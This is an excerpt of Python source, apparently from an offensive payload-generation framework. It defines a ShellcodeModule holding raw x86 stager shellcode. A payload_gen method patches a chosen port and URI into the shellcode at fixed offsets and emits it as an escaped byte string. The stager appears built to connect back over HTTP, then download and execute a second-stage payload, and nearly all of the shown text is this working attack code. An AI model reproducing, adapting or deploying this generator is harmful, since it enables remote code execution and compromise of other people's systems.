...
class ShellcodeModule:
    ...
    def __init__(self, cli_arguments):
        ...
        self.stager = (
            ...
            b"\x03\x53\x53\x68\x5C\x11\x00\x00\xEB\x3A\x50\x68\x57\x89\x9F\xC6" +
            b"\xFF\xD5\x53\x68\x00\x02\x60\x84\x53\x53\x53\xEB\x29\x53\x50\x68" +
            b"\xEB\x55\x2E\x3B\xFF\xD5\x96\x6A\x10\x5F\x53\x53\x53\x53\x56\x68" +
            b"\x2D\x06\x18\x7B\xFF\xD5\x85\xC0\x75\x18\x4F\x75\xED\x68\xF0\xB5" +
            b"\xA2\x56\xFF\xD5\xEB\x42\xE8\xD2\xFF\xFF\xFF\x2F\x31\x32\x33\x34" +
            b"\x35\x00\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68" +
            b"\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20\x00" +
            b"\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xBF\x8B\x07" +
            b"\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x7D\xFF\xFF\xFF")
    ...
    def payload_gen(self):
        ...
        final_http_shellcode = codecs.encode(self.stager[0:self.lport_offset], 'hex')
        final_p1 = "\\x" + '\\x'.join(codecs.decode(final_http_shellcode[i:i + 2], 'utf-8') for i in range(0, len(final_http_shellcode), 2))
        final_p1 += port_little_endian   # Add 91 bytes to get to URI offset

        final_http_shellcode2 = codecs.encode(self.stager[self.lport_offset + 2:self.uri_offset], 'hex')
        final_p2 = "\\x" + '\\x'.join(codecs.decode(final_http_shellcode2[i:i + 2], 'utf-8') for i in range(0, len(final_http_shellcode2), 2))
        sc = (b'\\x00').decode('utf-8')
        final_p2 += uri_shellcode + sc

        final_http_shellcode3 = codecs.encode(self.stager[self.uri_offset + 5:], 'hex')
        final_p3 = "\\x" + '\\x'.join(codecs.decode(final_http_shellcode3[i:i + 2], 'utf-8') for i in range(0, len(final_http_shellcode3), 2))
